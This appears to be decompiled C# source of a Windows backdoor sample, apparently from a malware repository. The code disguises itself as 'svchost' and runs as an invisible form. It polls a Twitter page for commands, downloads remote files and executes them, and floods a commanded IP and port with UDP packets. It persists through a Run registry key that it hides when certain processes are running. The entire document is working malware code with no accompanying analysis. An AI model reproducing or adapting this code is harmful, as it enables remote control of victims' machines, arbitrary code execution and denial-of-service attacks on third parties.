// Decompiled with JetBrains decompiler
// Type: svchost.Form1
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8CEC3837-325F-4E92-8801-9AD21C324561
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Backdoor.Win32.Twitbot.a-791bee9ec618bf8d4220236e10996a06e52c156c979832c6991bd5280284e988.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace svchost
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer \u0002;
    [AccessedThroughProperty("DDOS")]
    private System.Windows.Forms.Timer \u0003;
    [AccessedThroughProperty("DDOSinterval")]
    private System.Windows.Forms.Timer \u0005;
    [AccessedThroughProperty("getComs")]
    private System.Windows.Forms.Timer \u0008;
    [AccessedThroughProperty("WebBrowser1")]
    private WebBrowser \u0006;
    private string[] \u000E;
    private string \u000F;
    public string TwitterURL;
    public string Command;
    private string[] \u0002\u2000;

    public Form1()
    {
      this.Load += new EventHandler(this.\u0002);
      this.FormClosed += new FormClosedEventHandler(this.\u0002);
      this.FormClosing += new FormClosingEventHandler(this.\u0002);
      this.TwitterURL = \u000E.\u0002(138973798);
      this.\u0002();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0002 == null)
          return;
        this.\u0002.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0002()
    {
      this.\u0002 = (IContainer) new System.ComponentModel.Container();
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0002(new System.Windows.Forms.Timer(this.\u0002));
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0003(new System.Windows.Forms.Timer(this.\u0002));
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0005(new System.Windows.Forms.Timer(this.\u0002));
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0002(new WebBrowser());
      this.SuspendLayout();
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0002().Interval = 1;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0003().Interval = 60000;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0005().Enabled = true;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0005().Interval = 20000;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0002().Location = new Point(12, 12);
      WebBrowser webBrowser1 = this.svchost\u002EForm1​\u2005\u200A\u200A\u0002();
      Size size1 = new Size(20, 20);
      Size size2 = size1;
      webBrowser1.MinimumSize = size2;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0002().Name = \u000E.\u0002(138973849);
      WebBrowser webBrowser2 = this.svchost\u002EForm1​\u2005\u200A\u200A\u0002();
      size1 = new Size(51, 37);
      Size size3 = size1;
      webBrowser2.Size = size3;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0002().TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(10, 10);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.svchost\u002EForm1​\u2005\u200A\u200A\u0002());
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = \u000E.\u0002(138973835);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.Manual;
      this.ResumeLayout(false);
    }

    [DebuggerNonUserCode]
    internal virtual System.Windows.Forms.Timer svchost\u002EForm1​\u2005\u200A\u200A\u0002() => this.\u0003;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void svchost\u002EForm1​\u2005\u200A\u200A\u0002(System.Windows.Forms.Timer _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0003);
      if (this.\u0003 != null)
        this.\u0003.Tick -= eventHandler;
      this.\u0003 = _param1;
      if (this.\u0003 == null)
        return;
      this.\u0003.Tick += eventHandler;
    }

    [DebuggerNonUserCode]
    internal virtual System.Windows.Forms.Timer svchost\u002EForm1​\u2005\u200A\u200A\u0003() => this.\u0005;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void svchost\u002EForm1​\u2005\u200A\u200A\u0003(System.Windows.Forms.Timer _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0005);
      if (this.\u0005 != null)
        this.\u0005.Tick -= eventHandler;
      this.\u0005 = _param1;
      if (this.\u0005 == null)
        return;
      this.\u0005.Tick += eventHandler;
    }

    [DebuggerNonUserCode]
    internal virtual System.Windows.Forms.Timer svchost\u002EForm1​\u2005\u200A\u200A\u0005() => this.\u0008;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void svchost\u002EForm1​\u2005\u200A\u200A\u0005(System.Windows.Forms.Timer _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0008);
      if (this.\u0008 != null)
        this.\u0008.Tick -= eventHandler;
      this.\u0008 = _param1;
      if (this.\u0008 == null)
        return;
      this.\u0008.Tick += eventHandler;
    }

    [DebuggerNonUserCode]
    internal virtual WebBrowser svchost\u002EForm1​\u2005\u200A\u200A\u0002() => this.\u0006;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void svchost\u002EForm1​\u2005\u200A\u200A\u0002(WebBrowser _param1) => this.\u0006 = _param1;

    public string GetBetween(
      ref string strSource,
      ref string strStart,
      ref string strEnd,
      ref int startPos = default (int))
    {
      int length = strStart.Length;
      string between = string.Empty;
      int num1 = strSource.IndexOf(strStart, startPos);
      int num2 = strSource.IndexOf(strEnd, checked (num1 + length));
      if (num1 != -1 && num2 != -1)
        between = strSource.Substring(checked (num1 + length), checked (num2 - num1 + length));
      return between;
    }

    public int ProcessesRunning(string ProcessName)
    {
      int num;
      try
      {
        num = checked (Process.GetProcessesByName(ProcessName).GetUpperBound(0) + 1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num = 0;
        ProjectData.ClearProjectError();
      }
      return num;
    }

    public void getCommands()
    {
      WebClient webClient = new WebClient();
      string str1 = webClient.DownloadString(this.TwitterURL);
      webClient.Dispose();
      ref string local1 = ref str1;
      string str2 = \u000E.\u0002(138973887);
      ref string local2 = ref str2;
      string str3 = \u000E.\u0002(138973914);
      ref string local3 = ref str3;
      int num = 0;
      ref int local4 = ref num;
      this.Command = this.GetBetween(ref local1, ref local2, ref local3, ref local4);
      this.\u0002\u2000 = this.Command.Split(\u000E.\u0002(138973896).ToCharArray());
      if (this.Command.Contains(\u000E.\u0002(138973936)))
      {
        try
        {
          string str4 = this.\u0002\u2000[2];
          if (System.IO.File.Exists(\u0005.\u0002().FileSystem.SpecialDirectories.Temp + str4))
            return;
          webClient.DownloadFile(this.\u0002\u2000[1], \u0005.\u0002().FileSystem.SpecialDirectories.Temp + str4);
          if (Operators.CompareString(this.\u0002\u2000[3], \u000E.\u0002(138973921), false) != 0)
            return;
          Process.Start(\u0005.\u0002().FileSystem.SpecialDirectories.Temp + str4);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (this.Command.Contains(\u000E.\u0002(138973929)))
      {
        try
        {
          this.svchost\u002EForm1​\u2005\u200A\u200A\u0005().Enabled = false;
          this.svchost\u002EForm1​\u2005\u200A\u200A\u0003().Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.\u0002\u2000[3]) * 1000.0)));
          this.svchost\u002EForm1​\u2005\u200A\u200A\u0002().Enabled = true;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (this.Command.Contains(\u000E.\u0002(138973982)))
      {
        try
        {
          if (Operators.CompareString(this.\u0002\u2000[2], \u000E.\u0002(138973921), false) == 0)
            Process.Start(\u000E.\u0002(138973964) + this.\u0002\u2000[1]);
          else
            this.svchost\u002EForm1​\u2005\u200A\u200A\u0002().Navigate(\u000E.\u0002(138973964) + this.\u0002\u2000[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (this.Command.Contains(\u000E.\u0002(138974002)))
      {
        try
        {
          this.svchost\u002EForm1​\u2005\u200A\u200A\u0005().Enabled = false;
          this.removeStartup();
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        if (!this.Command.Contains(\u000E.\u0002(138973987)))
          return;
        try
        {
          object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(\u000E.\u0002(138974039), string.Empty));
          string MemberName = \u000E.\u0002(138974018);
          object[] objArray1 = new object[1];
          object[] objArray2 = objArray1;
          string[] strArray = this.\u0002\u2000;
          int index1 = 1;
          int index2 = index1;
          string str5 = strArray[index2];
          objArray2[0] = (object) str5;
          object[] objArray3 = objArray1;
          object[] Arguments = objArray3;
          bool[] flagArray = new bool[1]{ true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(objectValue, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (!flagArray[0])
            return;
          this.\u0002\u2000[index1] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (string));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void Add2Startup()
    {
      try
      {
        \u0005.\u0002().Registry.CurrentUser.OpenSubKey(\u000E.\u0002(138974070), true).SetValue(Application.ProductName, (object) (\u0005.\u0002().FileSystem.SpecialDirectories.CurrentUserApplicationData + \u000E.\u0002(138974082) + Application.ProductName + \u000E.\u0002(138974090)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void removeStartup()
    {
      try
      {
        \u0005.\u0002().Registry.CurrentUser.OpenSubKey(\u000E.\u0002(138974070), true).DeleteValue(Application.ProductName);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void hideRegistry()
    {
      try
      {
        if (this.ProcessesRunning(\u000E.\u0002(138974141)) >= 1 | this.ProcessesRunning(\u000E.\u0002(138974115)) >= 1)
          this.removeStartup();
        else
          this.Add2Startup();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0002(object _param1, FormClosedEventArgs _param2) => this.Add2Startup();

    private void \u0002(object _param1, FormClosingEventArgs _param2) => this.Add2Startup();

    private void \u0002(object _param1, EventArgs _param2)
    {
      if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName)).Length > 1)
        Application.Exit();
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.\u000F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.\u000F);
      FileSystem.FileClose(1);
      this.\u000E = Strings.Split(this.\u000F, \u000E.\u0002(138974162));
      this.TwitterURL = \u000E.\u0002(138973798) + this.\u000E[1];
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, \u0005.\u0002().FileSystem.SpecialDirectories.CurrentUserApplicationData + \u000E.\u0002(138974082) + Application.ProductName + \u000E.\u0002(138974090));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Add2Startup();
      this.getCommands();
    }

    private void \u0003(object _param1, EventArgs _param2)
    {
      try
      {
        UdpClient udpClient = new UdpClient();
        byte[] numArray = new byte[0];
        IPAddress addr = IPAddress.Parse(this.\u0002\u2000[1]);
        udpClient.Connect(addr, Conversions.ToInteger(this.\u0002\u2000[2]));
        byte[] bytes = Encoding.ASCII.GetBytes(\u000E.\u0002(138974146));
        udpClient.Send(bytes, bytes.Length);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0005(object _param1, EventArgs _param2)
    {
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0002().Enabled = false;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0003().Enabled = false;
      this.svchost\u002EForm1​\u2005\u200A\u200A\u0005().Enabled = true;
    }

    private void \u0008(object _param1, EventArgs _param2)
    {
      this.hideRegistry();
      this.getCommands();
    }
  }
}
